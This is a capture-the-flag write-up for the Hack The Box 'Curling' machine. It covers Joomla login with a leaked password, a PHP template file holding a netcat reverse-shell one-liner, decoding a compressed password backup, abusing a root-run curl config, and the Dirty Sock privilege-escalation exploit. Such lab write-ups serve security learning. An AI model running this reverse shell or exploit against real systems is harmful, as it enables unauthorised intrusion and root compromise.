## Quick Summary
<br> Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It's a linux box and its ip is `10.10.10.150` I added it to `/etc/hosts` as `curling.htb`. Let's jump right in !

## Nmap
<br> As always we will start with nmap to scan for open ports and services :
`nmap -sV -sT -sC curling.htb`
![](/images/hackthebox/curling/1.png)
<br> We only get 2 open ports , 80 running http and 22 running ssh. Let's look at http.

## HTTP Initial Enumeration
![](/images/hackthebox/curling/2.png)
<br> We see a blog titled "Cewl Curling site!" , and it's [joomla](https://www.joomla.org/). At this point I would run `joomscan` but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment :
![](/images/hackthebox/curling/3.png)
<br> So I checked `/secret.txt` and found this `base64` string :
![](/images/hackthebox/curling/4.png)
<br> Decoding :
![](/images/hackthebox/curling/5.png)
<br> `Curling2018!` we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts :
![](/images/hackthebox/curling/6.png)
<br> We will notice a name in one of the posts : `Floris` , now we can try to login as `floris` with the password `Curling2018!` :
![](/images/hackthebox/curling/7.png)
<br>
<br>
![](/images/hackthebox/curling/8.png)
<br> And it worked. While I was doing this enumeration I ran gobuster in the background and got these results :
```
/.htpasswd (Status: 403)
/.hta (Status: 403)
/administrator (Status: 301)
/.htaccess (Status: 403)
/bin (Status: 301)
/cache (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/templates (Status: 301)
/tmp (Status: 301)
```
<br> Let's go to `/administrator` and login to the administration panel :

## Editing Template Files and Getting a Reverse Shell :
<br> On the configuration section there's an option for templates :
![](/images/hackthebox/curling/12.png)
<br> By going to that we notice that protostar is the default style and template :
![](/images/hackthebox/curling/13.png)
<br>
<br>
![](/images/hackthebox/curling/14.png)
<br> From templates we will go to `Protostar Details and Files` and create a new `php` file :
![](/images/hackthebox/curling/15.png)
<br>
<br>
![](/images/hackthebox/curling/16.png)
<br> In the php file we will execute a system command to get a reverse shell :
```
<?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f');
?>
```
![](/images/hackthebox/curling/17.png)
<br> After we save the file we will go to `http://curling.htb/templates/protostar/file.php`
![](/images/hackthebox/curling/18.png)
<br> Then we check our listener :
![](/images/hackthebox/curling/19.png)

## User
<br> We got a reverse shell as `www-data` , in the `/home` directory there's a directory for `floris` :
![](/images/hackthebox/curling/20.png)
<br> We don't have read access to `user.txt` , but we notice a file called `password_backup` , by looking at that file :
![](/images/hackthebox/curling/21.png)
<br> It's a `hex dump` file , So I copied it to my box to reverse it :
![](/images/hackthebox/curling/22.png)
<br> To reverse a `hex dump` file we will use `xxd` , so `xxd -r pw_backup` :
![](/images/hackthebox/curling/23.png)
<br> Not a normal output , let's redirect the output to a file and see :
![](/images/hackthebox/curling/24.png)
<br> So what happened is , it turned out to be a `bzip2` file so I decompressed it then got a new `gzip` file , decompressed it and got another `bzip2` file , after decompression I got a `tar` file , then finally a `txt` file for the password :
![](/images/hackthebox/curling/25.png)
<br> Let's `ssh` as `floris` :
![](/images/hackthebox/curling/26.png)
<br> And we owned user !
<br>
<hr>
## Curling 
<br> By looking at the `/home` directory of `floris` again :
![](/images/hackthebox/curling/27.png)
<br> There's a directory called `admin-area` which contains two files :
![](/images/hackthebox/curling/28.png)
<br> `input` and `report`
<br> `input` :
![](/images/hackthebox/curling/29.png)
<br> `url = "http://127.0.0.1"`
<br> `report` :
![](/images/hackthebox/curling/30.png)
<br> It's obvious that this is the output of executing `curl` on `http://127.0.0.1` :
![](/images/hackthebox/curling/31.png)
<br> Even the name of the box is a hint `curling` , so what about changing that `url` from `localhost` to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe `root.txt` ? But only if it's getting executed by `root`. Let's try and see if it will work :
![](/images/hackthebox/curling/32.png)
<br> Then we will do : `watch cat report` , this is executing `cat report` every 2 seconds and giving us the output , easier than checking manually :
![](/images/hackthebox/curling/33.png)
<br> After some time we get the flag.
<br>
<hr>
## Dirty Sock ? Root shell !
<br> I didn't like the fact that I could only read the flag , I wanted a `root` shell. So I tried for a long time to bypass the `url` thing and get a reverse shell , but couldn't. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an `ubuntu` box , so I checked `snap` version to know if it's vulnerable to `CVE-2019-7304` known as `Dirty Sock` and of course it was :
![](/images/hackthebox/curling/34.png)
<br> This is not intended at all because by the time this box was released ,  `CVE-2019-7304` wasn't disclosed yet.
<br> I got the exploit from [here](https://github.com/initstring/dirty_sock) , Then hosted it on a python simple http server and downloaded it on the box :
![](/images/hackthebox/curling/35.png)
`python3 dirty_sockv2.py`
![](/images/hackthebox/curling/36.png)
<br> Now we can `su` to `dirty_sock` and execute commands as root :
![](/images/hackthebox/curling/37.png)
<br> Or just `sudo su` and we will get a root shell :
![](/images/hackthebox/curling/38.png)
<br> We owned root !
